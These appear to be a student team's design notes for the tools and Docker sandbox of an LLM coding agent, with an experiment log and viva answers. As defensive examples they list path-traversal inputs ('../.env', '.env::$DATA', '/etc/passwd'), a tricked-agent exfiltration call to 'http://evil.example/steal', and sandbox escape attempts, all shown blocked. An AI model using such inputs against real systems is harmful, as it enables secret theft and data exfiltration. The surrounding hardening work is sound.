# W2 — Runtime, tools and safety: learnings

Owner: Bernard

> The rest of the team will NOT read your code. They will write the report, present, and answer viva questions using only this file. Explain it like you are talking to someone who has never coded. Every option you tried goes in the log.

## 1. What this part does, in one paragraph

An LLM can only write text. It cannot save a file, run a test or call a website. **Tools** are ordinary Python functions on our computer that do those things for it. The LLM writes a request such as "use `write_file` with path `app.py` and this content". The agent program (Alice's part) runs the matching function and sends the answer back to the LLM as text. W2 builds those functions and keeps them safe:
- they only touch files inside the project folder;
- they never show the API key;
- they cut long output so it does not waste tokens;
- they stop anything that runs too long.

Stage 1 so far (task S1.1) gives **eight tools**, all in one file, `runtime/tools.py`:

| Tool | Does |
|---|---|
| `write_file` | Creates or replaces a file in the project |
| `read_file` | Reads a file in the project |
| `edit_file` | Replaces one exact piece of text in a file |
| `list_files` | Lists the project's files |
| `run_tests` | Runs the project's tests |
| `start_server` | Starts the backend the agent wrote |
| `http_request` | Calls that running backend |
| `stop_server` | Stops it |

Every tool answers in the same shape: `{"ok": true or false, "output": "text for the LLM"}`.

**The sandbox (task S1.2, `runtime/sandbox.py`)** is the locked box where code written by the LLM runs. Only `run_tests` and `start_server` run that code, so only they use it. Each run is a fresh **Docker container**: a small, separate Linux computer made from our `w2-sandbox` image. It is thrown away afterwards. Inside it, the code:
- sees only the project folder;
- has no internet;
- gets at most 512 MB of memory, 1 CPU and 128 processes;
- runs as an ordinary user, not the administrator;
- cannot change its own system files.

Without Docker, `SANDBOX=subprocess` runs the code as a normal program on our computer. That is faster but **not isolated**.

## 2. How it works, step by step

A real run on the church example. The church app (`benchmark/church_signup/reference/app.py`) was given an off-by-one bug: a full event still accepted one more person. These are the exact answers the tools gave (`root` is the project folder):

1. **The agent looks at the project.** `list_files(root)` → `{"ok": true, "output": "app.py\ntests/test_app.py"}`
2. **A tricked LLM tries to read the key.** `read_file(root, "../.env")` → `{"ok": false, "output": "Refused: '../.env' is outside the project folder"}`. How: `safe_path` asks the computer where `../.env` really is. That place is outside the project folder, so it is refused (log row 1).
3. **The agent runs its tests.** `run_tests(root)` starts a fresh Docker container that sees only the project folder, runs `pytest` in it with a 60-second limit, and throws the container away. The container has no internet and none of our settings, so no API key. It ends with:
   ```
   FAILED tests/test_app.py::test_full_event_refuses_sign_up - assert 201 == 409
   1 failed, 7 passed, 1 warning in 1.30s
   ```
   `ok` is `false`. The output was cut to at most 4,000 characters, keeping the start and the end, so this summary at the end is always there (log row 5).
4. **The agent fixes one line.** `edit_file(root, "app.py", '> event["max_people"]', '>= event["max_people"]')` → `"Wrote 1407 characters to app.py"`. The LLM only had to write about 40 characters, not the whole 1,407-character file (log row 3).
5. **Tests again.** `run_tests(root)` → `{"ok": true, "output": "8 passed, 1 warning in 1.12s"}`
6. **The agent starts the backend.** `start_server(root)` → `"Server running at http://127.0.0.1:56249"`. The port is a free one picked by the computer (log row 7). The tool asks the server every 0.1 s until it answers, about 4 seconds in Docker on this laptop (log rows 8 and 11).

   Inside, the server container has a **private network with no internet**. A container with no network at all cannot be reached from our computer either (log row 10). So a second tiny container, the **door**, joins that private network and forwards port 56249 on our computer to the server. Connections can come in through the door; the server still cannot reach the internet (tested).
7. **The agent tries it.** `http_request(root, "POST", "/church-events", {"title": "Harvest day", "date": "2026-11-20", "max_people": 1})` → `"201\n{"id":1,"title":"Harvest day","date":"2026-11-20","max_people":1}"`. The first line is the status code, then the reply.
8. **A tricked LLM tries to send data to another website.** `http_request(root, "GET", "http://evil.example/steal")` → refused: the path must start with `/`, and it is always added to our own server's address.
9. **Done.** `stop_server(root)` → `"Stopped the server at http://127.0.0.1:56249"`. Any server still running when the program ends is stopped automatically.

```
LLM ──"use run_tests"──▶ agent program (Alice) ──run_tests(root)──▶ runtime/tools.py ──▶ Docker container: pytest (no internet, 512 MB, 1 CPU, 60 s, no key)
LLM ◀──"1 failed … assert 201 == 409"── agent program ◀──{"ok": false, "output": …}── runtime/tools.py

start_server:  our computer 127.0.0.1:PORT ──▶ [door container] ──private network, no internet──▶ [server container :8000]
```

## 3. Everything we tried (experiment log)

One row per decision. Every decision compares at least 2 options. Add rows as you go, not at the end.

| # | Question | Options compared | How we tested it | Results (numbers) | Winner and why |
|---|---|---|---|---|---|
| 1 | How do the file tools stop the agent touching files outside its project folder? | A: look at the text of the path and refuse `..`, `/`, `:`, `.env`, `.git` · B: let the computer work out where the path really ends up, then check it is inside the project | The same 24 paths given to both: 6 good ones and 18 attacks (`../secret.txt`, `C:\Windows\win.ini`, a folder link pointing outside, `.ENV` in capitals, `.env::$DATA`, a 5,000-letter path, a hidden zero character…). Throwaway project with a fake `.env` and a real Windows folder link. `runtime/experiments/path_guard.py`, output in `runtime/experiments/results/path_guard.txt` | A: **5 attacks let through** (including reading a secret through the folder link, and `.ENV`), 2 good files wrongly refused (`my..notes.txt`, `envelope/.environment.txt`). B, first try: 0 refused wrongly, 1 let through (the 5,000-letter path). B after adding a 255-letter limit: **0 and 0** | B: it checks where the file really is, not what the name looks like, so tricks with links, capitals and dots do not work |
| 2 | Should `list_files` show a flat list of paths or an indented tree? | Flat (`routers/events.py` on each line) · tree (folder name once, files indented under it) | Both formats on the church reference (2 files) and a typical 12-file FastAPI project. `runtime/experiments/file_tools.py`, output in `runtime/experiments/results/file_tools.txt` | Church: 15 vs 15 characters. 12 files: flat 182, tree 168 (tree 8% shorter) | Flat: the saving is tiny, and every flat line is a full path the LLM can copy straight into `read_file`. With a tree it must glue folder and file names together itself, one more chance to get it wrong |
| 3 | To change a few lines, should the LLM resend the whole file or only the changed piece? | `write_file` (whole new file) · `edit_file` (old piece + new piece) | 3 typical fixes on the church `app.py` (change a status code, add a field, sort a list). Counted the characters the LLM has to write. Same script as row 2 | `write_file` 4,271 characters (~1,067 tokens, $0.021) · `edit_file` 284 characters (~71 tokens, $0.0014): **11–23x fewer** per fix | Keep both: `edit_file` for small fixes, `write_file` for new files. Whether the LLM actually uses `edit_file` well is tested later with the agent loop (Alice, S3) |
| 4 | Does `read_file` need a "read lines 50–100" option? | Whole file (cut to 4,000 characters) · line ranges | Measured every Python file in `benchmark/` against the 4,000 limit. Same script as row 2 | Largest is 2,588 characters (the hidden tests); `app.py` is 1,407. All fit | Whole file: simpler for the LLM and for us. If generated files ever pass 4,000 characters, the start and end are still shown and line ranges can be added then |
| 5 | How much of a long tool output should the LLM get back, and which part? | Limit 2,000 / 4,000 / 8,000 characters × keep the start and the end / keep only the start | 7 bugs planted in the church app (wrong status code, off-by-one capacity check, syntax error, import typo, wrong URL, renamed field, a debug print of 75,000 characters), run against 8 agent-style tests. For each cut output: can the LLM still see the summary line, every failing test's name, and the words saying what is wrong? 7 bugs × 3 facts = 21. `runtime/experiments/output_limit.py`, output in `results/output_limit.txt` | Start and end: **21/21 at every limit**. Start only: 14–20/21, because pytest prints its summary at the very end. Without any cut, the debug-print bug gives 151,259 characters (about 38,000 tokens) in one reply | Start and end, 4,000 characters. 2,000 already scored 21/21, but the end half must hold the whole failure list (about 90 characters per failing test): 2,000 fits about 11 failing tests, 4,000 about 22, for about 160 more tokens per call |
| 6 | How much detail should pytest print for each failure? | `--tb=long` (whole test function) · `--tb=short` (the failing line and its error) · `--tb=line` (one line per failure) | Same 7 bugs and the same 21-fact score as row 5 | Full size for the wrong-status bug: long 4,859, short 3,167, line 2,218 characters. All three: 21/21 facts | `short`: about 35% smaller than long. `line` is about 30% smaller again but drops the line of test code that failed, which this score cannot measure. Revisit if Alice's repair experiments show `line` fixes bugs just as well |
| 7 | Which port should a generated backend's server use? | Always 8001 · a free port the operating system picks each time | Started two church projects at the same moment. `runtime/experiments/server_start.py`, output in `results/server_start.txt` | Fixed 8001: the second server **died** ("address already in use"). Free port: both ran (ports 62430 and 62436) | Free port: builds can run side by side (Joseph's harness, two users) and never clash with something already on 8001 |
| 8 | How does `start_server` know the server is ready? | Sleep 1 s · sleep 2 s · ask every 0.1 s with a 1 s connect limit · ask every 0.1 s with a 0.1 s connect limit · watch uvicorn's log for "Application startup complete" | 10 starts each of the church app, timed from launch to the first good request. Same script as row 7 | All 10/10. Median seconds: 1.54 / 2.51 / 2.52 / **2.26** / 2.04. The app needs about 2 s to start on this laptop. "Sleep 1 s" only worked because Windows keeps retrying a connection for a while | Ask with a 0.1 s connect limit. A fixed sleep is a guess that breaks on a slower machine or in Docker. Watching the log is 0.2 s faster but depends on uvicorn's exact wording. Asking tests the real thing: does it answer? |
| 9 | When tests fail, does putting a one-line reason first help the LLM fix the bug? | A: pytest's output as it is (cut to 4,000) · B: the `FAILED …` lines and the summary line copied to the top, then the full output | The 7 planted bugs × 2 formats × 3 repeats = 42 calls to `claude-opus-5-5` (effort `low`). Each call got `app.py`, the tests and the `run_tests` output, and was asked for the fixed `app.py`. We then ran the tests again. Fixed = all 8 pass. `runtime/experiments/error_format.py`, output in `results/error_format.txt`. **Cost $0.85** | A: **21/21 fixed**, 609 output tokens on average, $0.43 · B: **21/21 fixed**, 582 tokens, $0.42 | A, the raw output: no difference was measured, and B needs extra code. These bugs were easy once the LLM saw the whole file. A harder test (many files, no file contents in the prompt) may show a difference later, with Alice's agent loop |
| 10 | Which Docker network lets our computer reach the server while the server cannot reach the internet? | `none` (no network) · an `--internal` network (private, no internet) · `bridge` (Docker's normal network) · an internal network plus a "door" container that forwards one port | A test container tried to open `http://example.com`; our computer tried to open the container's published port | `none`: internet blocked, our computer **cannot** reach it. Internal: same. Bridge: our computer reaches it, but **so does the internet** (example.com reached). Internal + door: internet blocked (`test_server_cannot_reach_the_internet_but_we_can_reach_it`), our computer reaches it | Internal network + door. It is the only option with both. It costs one extra small image (`alpine/socat`, a program that only forwards connections) and a few more milliseconds per request (row 11) |
| 11 | Docker or subprocess as the sandbox: what does safety cost in speed? | Docker (`SANDBOX=docker`) · plain subprocess (`SANDBOX=subprocess`) | The same church project in both. `run_tests` 10 times, `start_server` 10 times, 200 GET + 200 POST requests straight to the server. Then 7 escape scripts run once in each. `runtime/experiments/sandbox_compare.py`, output in `results/sandbox_compare.txt` | **Speed** (median / max), subprocess vs Docker: run_tests 1.46 / 1.84 s vs 3.38 / 4.27 s; start_server 1.18 / 1.26 s vs 4.24 / 5.25 s; GET p50 1.1 ms, p95 1.8 ms vs 10.3 ms, 55 ms. **Isolation**, subprocess: reached example.com, **read a secret file next to the project, wrote a file outside it, took 1 GB of memory**. Docker: blocked all four (memory: killed at 512 MB). Both: no API key. CPU, 4 busy processes: 1.0 s vs 1.9 s (the 1-CPU cap) | Docker: about 2–3 s more per call, which is small next to an LLM step (several seconds each), and it blocks every escape that subprocess lets through. The extra ~10 ms per request is too small for a person to notice. Subprocess also stalled sometimes on this laptop (one full test run took 514 s instead of 89 s) |
| 12 | How long should `run_tests` wait before stopping stuck tests? | 30 s · 60 s · 120 s | Good runs: the church tests (8) and a bigger project (40 tests), 5 runs each in Docker. Stuck run: a test that loops forever, with each limit. `runtime/experiments/timeout_choice.py`, output in `results/timeout_choice.txt` | Good runs: slowest 5.4 s (8 tests) and 7.4 s (40 tests), so no limit killed a good run. Stuck test stopped after 30.7 / 60.8 / 120.6 s, with **0 containers left behind** each time | 60 s: 8 times the slowest good run, so slower laptops, Docker's first start and bigger projects still fit. 30 s would only be 4 times, and this laptop has shown stalls of over 20 s. 120 s makes the agent wait twice as long on a stuck test for no gain |

## 4. What we chose, and why

- **Every file path is checked by finding where it really ends up**, then making sure that is inside the project. `.env`, `.git`, colons and paths over 255 letters are refused. Row 1, decision 0022.
- **File tools:** a flat file list, whole-file reads, and `edit_file` next to `write_file`. Rows 2–4, decision 0023.
- **All tool output is cut to 4,000 characters, keeping the start and the end.** `run_tests` uses `pytest -q --tb=short`. Rows 5–6, decision 0024.
- **`start_server` uses a free port and asks every 0.1 s until the server answers.** `http_request` can only reach that server. Rows 7–8, decision 0025.
- **Failing tests are reported exactly as pytest prints them**, with no reformatting. Row 9, decision 0026.
- **Generated code never gets our settings**: in Docker, the container gets only `PYTHONUTF8` and `PYTHONDONTWRITEBYTECODE`; in subprocess mode, only `PATH`, `SYSTEMROOT`, `TEMP`, `TMP` and `PYTHONUTF8`. So the API key is never there (tested).
- **Generated code runs in a Docker sandbox by default**:
  - no internet;
  - only the project folder;
  - 512 MB of memory, 1 CPU, 128 processes;
  - not the administrator;
  - read-only system files.

  The server sits on a private network behind a "door" container. `SANDBOX=subprocess` exists for machines without Docker, but must be chosen on purpose: if Docker is not running, the tools say so instead of silently running unprotected. Rows 10–11, decision 0027.
- **`run_tests` stops tests after 60 seconds** and removes their container. Row 12, decision 0028.

## 5. What breaks, and the limits

Every failure case below was run. Each is a test in `runtime/tests/`: 51 tests, all passing in Docker mode. In subprocess mode the 7 sandbox tests are skipped, because that mode does not isolate anything.

| Failure case | What happens |
|---|---|
| Path outside the project (`../x`, `C:\...`, `/etc/passwd`, `\\server\share`, a folder link pointing out) | `Refused: … is outside the project folder` |
| `.env` or `.git` in any spelling (`.ENV`, `.env.`, `.env::$DATA`, `sub/.env`) | `Refused: … is a protected file` |
| Empty path, a path over 255 letters, a hidden zero character, a colon | `Refused: … is not a valid project path` |
| Reading a missing file / a picture or other binary file | `No such file: …` / `Refused: … is not a text file` |
| Reading a 10 MB file | Start and end shown, middle cut, under 4,100 characters |
| Writing 10 million characters | Refused (limit 200,000), nothing written |
| Writing onto a folder | `Refused: tests is a folder, not a file` |
| `edit_file` when the old text appears 0 times or several times | `Not changed: … found N times …; it must be found exactly once` |
| A test that loops forever | Stopped after the limit: `Tests stopped: still running after 60 seconds …` |
| A test that prints 75,000 characters | Cut to under 4,100 characters; the summary is still there |
| Generated code looking for `LLM_API_KEY` | Not there: tests and servers get only `PATH`, `SYSTEMROOT`, `TEMP`, `TMP` and `PYTHONUTF8` |
| An app that crashes on start (import typo), or has no `app.py` | `Server crashed while starting:` plus uvicorn's error |
| An app that never answers | `Server did not answer within 20 seconds`, then it is killed |
| An endpoint that hangs | `No answer within 10 seconds` |
| An endpoint that kills the server | `The server has stopped. Its log: …` |
| A 1 MB reply or a plain-text reply | Cut / shown as is |
| `http_request` to another website (`http://…`, `example.com`, `@example.com`) | Refused. `//example.com` is allowed but goes to **our** server (404), because the path is always added to `http://127.0.0.1:PORT` |
| Two projects started at once | Each gets its own free port |
| Generated code tries the internet (tests or server) | Blocked in Docker (`ConnectError`) |
| Generated code opens a file next to the project (`../outside_secret.txt`) | Not there in Docker: the container only has the project, mounted at `/app` |
| Generated code writes to system folders (`/usr/evil.txt`) | Refused: the container's system files are read-only, and it runs as user 1000, not root |
| Tests take 1 GB of memory | The sandbox kills them at 512 MB; `run_tests` says `Tests were killed: they used more than the sandbox's memory limit (512 MB).` |
| A stuck test in Docker | Stopped at the limit, and its container is removed (stopping the `docker` command alone would leave the container running) |
| The app writes its SQLite database (`app.db`) | Works: the project folder is the one place the sandbox can write |
| Docker is not running, or the image was not built | `ok: false` with Docker's own error message, e.g. `No such image: w2-sandbox` |

**Limits (honest list):**
- **`SANDBOX=subprocess` is not a sandbox.** It hides the key and has a time limit, nothing more: generated code can read and write files outside the project, use the internet and use all the memory (row 11). Use it only where Docker cannot run, and say so in any results.
- **The project folder itself is writable.** Generated code can fill it with a huge file; Docker sets no disk limit on it.
- **Running programs directly on this Windows laptop sometimes stalls.** One `run_tests` hit the 60-second limit once (16 retries took about 3 s), and one full test run in subprocess mode took 514 s instead of 89 s, with a server that did not start within 20 s. My guess is Windows scanning brand-new files. Docker runs were steady. The time limits are what catch it.
- **Docker adds time**: about 2–3 s per test run or server start, and about 10 ms per request (row 11).
- **Docker Desktop must be running**, and the image built once (section 6). Containers run Linux even on Windows, so file paths inside them use `/`.
- **Tested on Windows 11** with Docker Desktop 29.9 (Python 3.12 inside the containers, 3.14 on the laptop).
- **Not yet tested with a real agent:**
  - whether the LLM actually uses `edit_file` well;
  - whether `--tb=line` would be enough;
  - which set of tools is best: six, six plus `edit_file`, or one "run any command" tool.
  These need Alice's agent loop (S3).
- A colon is never allowed in a file name. Python projects don't need one.
- The list of running servers lives in memory. If the agent program crashes hard, its servers are stopped on exit, but a hard kill could leave one running.

## 6. How to run it, and how the next person uses it

**Set up and check** (from the repo root; Windows notes in `knowledge/environment.md`):
```
uv sync
docker build -t w2-sandbox runtime/sandbox     # once: the sandbox image (about 270 MB, 1-2 minutes)
docker pull alpine/socat:1.8.0.3               # once: the "door" for servers
uv run pytest runtime -q                       # expect: 51 passed (about 3 minutes)
```
Docker Desktop must be running. On a machine without Docker, set the environment variable `SANDBOX=subprocess` (PowerShell: `$env:SANDBOX="subprocess"`). Then expect 44 passed and 7 skipped, and remember that nothing is isolated.

**Re-run the experiments** (all free, except `error_format.py`, which costs about $0.85):
```
uv run python runtime/experiments/path_guard.py      # log row 1
uv run python runtime/experiments/file_tools.py      # rows 2-4
uv run python runtime/experiments/output_limit.py    # rows 5-6
uv run python runtime/experiments/server_start.py    # rows 7-8
uv run --env-file .env --with anthropic python runtime/experiments/error_format.py   # row 9, needs the key
uv run python runtime/experiments/sandbox_compare.py   # rows 10-11 (about 5 minutes)
uv run python runtime/experiments/timeout_choice.py    # row 12 (about 5 minutes)
```
Results are saved in `runtime/experiments/results/`.

**What you get: `runtime/tools.py`.** Import the functions and pass the project folder first. The LLM chooses only the other arguments; your program always sets `root`.

| Function | Arguments the LLM fills in | `ok` is `true` when | `output` |
|---|---|---|---|
| `write_file(root, path, content)` | `path`, `content` | the file was written | `Wrote N characters to path` |
| `read_file(root, path)` | `path` | the file was read | the file's text |
| `edit_file(root, path, old, new)` | `path`, `old`, `new` | `old` was found exactly once and replaced | `Wrote N characters to path` |
| `list_files(root)` | — | always | one path per line, or `(no files yet)` |
| `run_tests(root, path="tests", timeout=60)` | `path` (optional) | **all tests passed** | pytest's output (runs in the sandbox) |
| `start_server(root, timeout=20)` | — | the server answered | `Server running at http://127.0.0.1:PORT` (runs in the sandbox) |
| `http_request(root, method, path, json=None, timeout=10)` | `method`, `path`, `json` | any reply came back (even 404 or 500) | status code, a new line, then the reply body |
| `stop_server(root)` | — | a server was stopped | `Stopped the server at …` |

Rules that hold for every tool:
- Every tool returns `{"ok": bool, "output": str}`.
- It never raises an error.
- `output` is at most about 4,100 characters.
- On failure, `output` starts with the reason.

Example (copy and run from the repo root):
```python
from runtime.tools import write_file, run_tests, start_server, http_request, stop_server

root = "projects/church_demo"        # projects/ is git-ignored
write_file(root, "app.py", open("benchmark/church_signup/reference/app.py").read())
result = start_server(root)
print(result)                        # {'ok': True, 'output': 'Server running at http://127.0.0.1:61772'}
base_url = result["output"].split()[-1]               # the URL by itself, e.g. for BASE_URL in the hidden tests
print(http_request(root, "GET", "/church-events"))   # {'ok': True, 'output': '200\n[]'}
print(stop_server(root))
```

**For Joseph (S2.3, the harness):**
1. Run `start_server(root)` and take the URL from the end of `output`.
2. Set `BASE_URL` to it and `OPS_FILE` to the project's `ops.json`, then run the hidden tests as in `knowledge/environment.md`.
3. Call `stop_server(root)` at the end.

`start_server` expects `app.py` with an object called `app` in the project folder. The URL works from your own computer even though the server is in the sandbox (through the door), so the hidden tests run unchanged. The project folder must be somewhere Docker Desktop can see (anywhere under `C:\Users` on Windows; `projects/` in the repo is fine).

**For Alice (S3, the agent):** give the LLM one tool definition per row of the table above, using each function's docstring as its description. Call the function with `root` plus the LLM's arguments, and send `output` back as the tool result. Mark it as an error when `ok` is false.

**Don't:**
- let the LLM choose `root`;
- pass the real environment to generated code;
- run generated code without these tools, or with `SANDBOX=subprocess` when Docker is available;
- forget `stop_server`: each running server keeps two containers and a network alive (they are also removed when your program ends normally).

## 7. Viva questions you should be able to answer

| Question | Answer |
|---|---|
| Who actually writes the file when the LLM "uses `write_file`"? | Our Python function does. The LLM only writes a request (tool name plus arguments). The agent program calls the function and sends `{"ok", "output"}` back to the LLM as text |
| How do you stop the agent reading `../.env`? | `safe_path` asks the operating system for the real final path, then checks it is inside the project folder. Checking the text alone let 5 of 18 attacks through, for example a folder link and `.ENV` in capitals; this way let 0 through (row 1) |
| Why is `.ENV` dangerous on Windows? | Windows ignores capital letters, trailing dots and `::$DATA` in file names, so `.ENV`, `.env.` and `.env::$DATA` all open `.env`. We lower-case the name, strip dots and spaces, and ban colons |
| Why cut tool output, and why keep the end? | Every reply is re-sent to the LLM on every later step, so long replies cost tokens many times over. One debug print gave 151,259 characters, about 38,000 tokens. pytest prints its summary at the end: keeping only the start lost up to 7 of 21 key facts; keeping start and end lost none (row 5) |
| Why 4,000 characters and not 2,000? | Both kept all 21 facts. But the end half must hold the list of failing tests, about 90 characters each: 4,000 fits about 22, 2,000 only about 11, for about 160 extra tokens |
| Why have `edit_file` when `write_file` exists? | For a small fix the LLM writes 11 to 23 times fewer characters (output tokens cost $20 per million, 5 times input), and it cannot accidentally change the rest of the file |
| How can generated tests not see the API key? | `run_tests` and `start_server` start their program with only five settings (`PATH`, `SYSTEMROOT`, `TEMP`, `TMP`, `PYTHONUTF8`); a test proves `LLM_API_KEY` is absent |
| What stops a test that never ends? | A time limit (60 s by default). Python's `subprocess.run` kills the program when it is reached, and the LLM is told it was stopped |
| Why a free port instead of 8001? | Two servers on 8001: the second died. A free port lets builds run side by side (row 7) |
| How does `start_server` know the server is ready? | It asks `/openapi.json` every 0.1 s until anything answers. A fixed sleep is a guess that breaks on slower machines (row 8) |
| Can `http_request` be used to send data to another website? | No. The path must start with `/`, and it is always added to `http://127.0.0.1:PORT`. Even `//example.com` reaches our own server |
| What is the sandbox? | A fresh Docker container for every test run or server: a small separate Linux computer that sees only the project folder. It has no internet, 512 MB of memory, 1 CPU and 128 processes, runs as an ordinary user, and is deleted afterwards |
| Why Docker and not just a subprocess? | Measured with the same 7 escape scripts: the subprocess reached the internet, read a secret next to the project, wrote outside the project and took 1 GB of memory. Docker blocked all four. It costs about 2–3 s per call and about 10 ms per request (row 11) |
| If the server has no internet, how does our computer reach it? | A container with no network cannot be reached at all (row 10). So the server gets a private network with no way out, and a tiny "door" container joins it and forwards one port from our computer. Connections come in; nothing goes out |
| What happens if generated tests use too much memory? | Docker kills them at 512 MB (exit code 137), and `run_tests` tells the LLM they were killed for memory, instead of returning an empty answer |
| Why must `run_tests` remove the container on a timeout? | Stopping the `docker` command does not stop the container it started. Without `docker rm -f`, a stuck test would keep using a CPU forever. The experiment checked that 0 containers were left |
| Why is the time limit 60 seconds? | The slowest good run was 7.4 s (40 tests), so 60 s is 8 times that and never killed a good run; a stuck test waits 60 s, not 120 (row 12) |
| Why not fall back to subprocess automatically when Docker is off? | It would silently turn off every protection. The tools return an error instead, and subprocess must be chosen on purpose |
| What is still not safe? | Subprocess mode isolates nothing. In Docker, the project folder is writable and has no size limit. Attacks are tested one by one in S1.3 |

## 8. Glossary

Every technical word used above, in one plain sentence each.

- **Environment variable**: a named setting your computer gives every program it starts, such as `PATH` or `PYTHONUTF8`.
- **PATH**: the list of folders the computer searches, in order, when you type a command like `python3`. The first match wins.
- **UTF-8**: the standard way to store text (including emoji and accented letters) as bytes. Windows Python does not assume it unless `PYTHONUTF8=1` is set.
- **Pre-commit hook**: a small script git runs just before saving a commit. Ours refuses keys, `.env`, model files and a stale README.
- **Branch**: a separate line of commits. All of Stage 1 goes on `w2-tools` and is merged into `main` at the handoff.
- **Tool**: a normal function the LLM can ask the agent program to run for it, because the LLM itself can only write text.
- **Project folder (`root`)**: the one folder the agent builds a backend in. The tools never go outside it.
- **Path**: the address of a file, such as `tests/test_app.py`. `..` means "the folder above", so `../.env` points outside the project.
- **Resolve (a path)**: ask the operating system where a path really ends up, after following `..` and links.
- **Folder link (junction, symlink)**: a fake folder that is really a door to another folder somewhere else.
- **`.env`**: the file on our laptop holding the API key. The tools refuse to read, write or list it.
- **Process**: a running program. `run_tests` and `start_server` start a separate process, so a crash or endless loop there cannot freeze the agent.
- **Subprocess**: a process started by our Python program (`subprocess.run` waits for it to end; `subprocess.Popen` lets it keep running, as the server does).
- **Timeout**: the most time we wait before stopping something.
- **pytest**: the Python program that runs tests and prints which passed and which failed.
- **Traceback (`--tb`)**: pytest's printout of where an error happened. `long` shows a lot, `short` the failing line, `line` one line per failure.
- **Server / uvicorn**: uvicorn is the program that runs a FastAPI `app` so it answers web requests.
- **Port**: a number (like 8001) that tells the computer which running program a network request is for. Only one program can use a port at a time.
- **127.0.0.1 (localhost)**: the address meaning "this same computer". A server listening there cannot be reached from other computers.
- **HTTP request / status code**: a message to a web server (`GET` to read, `POST` to create…). The reply starts with a number: 200 OK, 201 created, 404 not found, 409 conflict, 422 bad input, 500 server error.
- **`/openapi.json`**: the description of every endpoint that FastAPI publishes automatically; we use it to check the server is up.
- **Token**: the piece of text an LLM reads or writes, about 4 characters of English or code. API prices are per million tokens.
- **Off-by-one bug**: using `>` where `>=` was needed (or similar), so a limit is wrong by exactly one.
- **Sandbox**: a locked box where untrusted code runs, so whatever it does cannot harm the rest of the computer.
- **Docker / container / image**: Docker runs containers. A container is a small, separate Linux computer inside ours. An image is the template it starts from (ours, `w2-sandbox`, holds Python and the fixed stack).
- **Dockerfile**: the recipe Docker follows to build an image (`runtime/sandbox/Dockerfile`).
- **Mount**: making one folder of our computer appear inside a container. We mount only the project folder, at `/app`.
- **Docker network (`none`, internal, bridge)**: who a container can talk to. `none`: nobody. Internal: only other containers on the same private network. Bridge: the internet and our computer.
- **Door (socat)**: a tiny container running `socat`, a program that just passes connections from one place to another. It lets our computer reach the server without giving the server any way out.
- **Root / administrator**: the user who may change anything. Our containers run as user 1000, an ordinary user.
- **Exit code**: the number a program returns when it ends. 0 means success; 137 means it was killed, here for using too much memory.
- **p50 / p95**: the middle time and the time 95% of requests beat. p95 shows the slow cases.
